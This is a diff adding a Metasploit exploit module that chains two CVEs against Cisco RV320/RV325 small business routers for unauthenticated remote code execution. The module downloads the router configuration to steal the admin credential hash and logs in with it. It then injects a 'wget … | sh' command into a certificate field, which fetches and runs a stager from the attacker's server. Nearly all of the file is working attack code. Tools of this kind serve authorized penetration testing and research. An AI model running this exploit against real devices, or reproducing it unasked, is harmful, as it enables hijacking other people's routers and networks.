@@ -1,0 +1,207 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HttpServer::HTML
+  include Msf::Exploit::CmdStager
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Cisco RV320 and RV325 Unauthenticated Remote Code Execution",
+      'Description'    => %q{
+        This exploit module combines an information disclosure (CVE-2019-1653)
+        and a command injection vulnerability (CVE-2019-1652) together to gain
+        unauthenticated remote code execution on Cisco RV320 and RV325 small business
+        routers. Can be exploited via the WAN interface of the router. Either via HTTPS
+        on port 443 or HTTP on port 8007 on some older firmware versions.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         => [
+        'RedTeam Pentesting GmbH', # Discovery, Metasploit
+        'Philip Huppert',          # Discovery
+        'Benjamin Grap'            # Metasploit
+      ],
+      'References'     => [
+          [ 'CVE','2019-1653' ],
+          [ 'CVE','2019-1652' ],
+          [ 'EDB','46243' ],
+          [ 'BID','106728' ],
+          [ 'BID','106732' ],
+          [ 'URL', 'https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-002/-cisco-rv320-unauthenticated-configuration-export' ],
+          [ 'URL', 'https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-004/-cisco-rv320-command-injection' ]
+      ],
+      'Platform'       => 'linux',
+      'Targets'        =>
+        [
+         [ 'LINUX MIPS64',
+          {
+           'Platform' => 'linux',
+           'Arch'     => ARCH_MIPS64
+          }
+         ]
+        ],
+      'Payload'        =>
+        {
+         'BadChars' => ""
+        },
+      'CmdStagerFlavor' => [ 'bourne' ],
+      'Privileged'     => true,
+      'DisclosureDate' => "Sep 9 2018",
+      'DefaultTarget'  => 0))
+
+    register_options([
+      Opt::RPORT(8007), # port of Cisco webinterface
+      OptString.new('URIPATH', [true, 'The path for the stager. Keep set to default! (We are limited to 50 chars for the initial command.)', '/']),
+      OptInt.new('HTTPDELAY', [true, 'Time that the HTTP Server will wait for the payload request', 15]),
+      OptBool.new('USE_SSL', [false, 'Negotiate SSL/TLS for outgoing connections', false]) # Don't use 'SSL' option to prevent HttpServer from picking this up.
+    ])
+    deregister_options('SSL') # prevent SSL in HttpServer and resulting payload requests since the injected wget command will not work with '--no-check-certificate' option.
+    deregister_options('SSLCert') # not required since stager only uses HTTP.
+  end
+
+  def execute_command(cmd, opts = {})
+    # use generated payload, we don't have to do anything here
+  end
+
+  def autofilter
+    true
+  end
+
+  def on_request_uri(cli, req)
+    print_status("#{peer} - Payload request received: #{req.uri}")
+    @cmdstager = generate_cmdstager().join(';')
+    send_response(cli, "#{@cmdstager}")
+  end
+
+  def primer
+    payload_url = get_uri
+    print_status("Downloading configuration from #{peer}")
+    if(datastore['USE_SSL'])
+      print_status("Using SSL connection to router.")
+    end
+    res = send_request_cgi({
+      'uri' => normalize_uri("cgi-bin","config.exp"),
+      'SSL' => datastore['USE_SSL']
+    })
+    unless res
+      vprint_error('Connection failed.')
+      return nil
+    end
+
+    unless res.code == 200
+      vprint_error('Could not download config. Aborting.')
+      return nil
+    end
+
+    print_status("Successfully downloaded config")
+    username = res.body.match(/^USERNAME=([a-zA-Z]+)/)[1]
+    pass = res.body.match(/^PASSWD=(\h+)/)[1]
+    authkey = "1964300002"
+    print_status("Got MD5-Hash: #{pass}")
+    print_status("Loging in as user #{username} using password hash.")
+    print_status("Using default auth_key #{authkey}")
+    res2 = send_request_cgi({
+      'uri' => normalize_uri("cgi-bin","userLogin.cgi"),
+      'SSL' => datastore['USE_SSL'],
+      'method' => 'POST',
+      'data' => "login=true&portalname=CommonPortal&password_expired=0&auth_key=#{authkey}&auth_server_pw=Y2lzY28%3D&submitStatus=0&pdStrength=1&username=#{username}&password=#{pass}&LanguageList=Deutsch&current_password=&new_password=&re_new_password="
+    })
+
+    unless res
+      vprint_error('Connection failed during login. Aborting.')
+      return nil
+    end
+
+    unless res.code == 200
+      vprint_error('Login failed with downloaded credentials. Aborting.')
+      return nil
+    end
+
+    #Extract authentication cookies
+    cookies = res2.get_cookies()
+    print_status("Successfully logged in as user #{username}.")
+    print_status("Got cookies: #{cookies}")
+    print_status("Sending payload. Staging via #{payload_url}.")
+    #Build staging command
+    command_string = CGI::escape("'$(wget -q -O- #{payload_url}|sh)'")
+    if(command_string.length <= 63)
+      print_status("Staging command length looks good. Sending exploit!")
+    else
+      vprint_error("Warning: Staging command length probably too long. Trying anyway...")
+    end
+
+    res3 = send_request_cgi({
+      'uri' => normalize_uri("certificate_handle2.htm"),
+      'SSL' => datastore['USE_SSL'],
+      'method' => 'POST',
+      'cookie' => cookies,
+        'vars_get' => {
+         'type' => '4',
+        },
+        'vars_post' => {
+          'page' => 'self_generator.htm',
+                    'totalRules' => '1',
+                    'OpenVPNRules' => '30',
+                    'submitStatus' => '1',
+                    'log_ch' => '1',
+                    'type' => '4',
+                    'Country' => 'A',
+                    'state' => 'A',
+                    'locality' => 'A',
+                    'organization' => 'A',
+                    'organization_unit' => 'A',
+                    'email' => 'any@example.com',
+                    'KeySize' => '512',
+                    'KeyLength' => '1024',
+                    'valid_days' => '30',
+                    'SelectSubject_c' => '1',
+                    'SelectSubject_s' => '1'
+        },
+        'data' => "common_name=#{command_string}"
+    })
+    unless res3
+      vprint_error('Connection failed while sending command. Aborting.')
+      return nil
+    end
+
+    unless res3.code == 200
+      vprint_error('Sending command not successful.')
+      return nil
+    end
+    print_status("Sending payload timed out. Waiting for stager to connect...")
+  end
+
+  def check
+    #Check if device is vulnerable by downloading the config
+    res = send_request_cgi({'uri'=>normalize_uri("cgi-bin","config.exp")})
+
+    unless res
+      vprint_error('Connection failed.')
+      return CheckCode::Unknown
+    end
+
+    unless res.code == 200
+      return CheckCode::Safe
+    end
+
+    unless res.body =~ /PASSWD/
+      return CheckCode::Detected
+    end
+
+    CheckCode::Vulnerable
+  end
+
+  def exploit
+    # Main function.
+    # Setting delay for the Stager.
+    Timeout.timeout(datastore['HTTPDELAY']) {super}
+  rescue Timeout::Error
+    print_status("Waiting for stager connection timed out. Try increasing the delay.")
+  end
+end
